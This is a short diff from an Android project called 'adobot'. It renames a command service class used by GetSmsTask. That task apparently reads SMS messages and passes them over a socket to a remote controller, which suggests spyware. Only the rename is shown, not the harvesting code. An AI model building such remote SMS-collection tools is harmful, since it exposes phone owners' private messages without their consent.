@@ -8,7 +8,7 @@ import android.net.Uri;
 import android.support.v4.content.ContextCompat;
 import android.util.Log;
 
-import com.android.adobot.CommandService;
+import com.android.adobot.CommandReceiverService;
 import com.android.adobot.CommonParams;
 
 import org.json.JSONObject;
@@ -30,7 +30,7 @@ public class GetSmsTask extends BaseTask {
     private Socket socket;
     private int numsms;
 
-    public GetSmsTask(CommandService client, int numsms) {
+    public GetSmsTask(CommandReceiverService client, int numsms) {
         context = client;
         this.socket = client.getSocket();
         this.numsms = numsms;
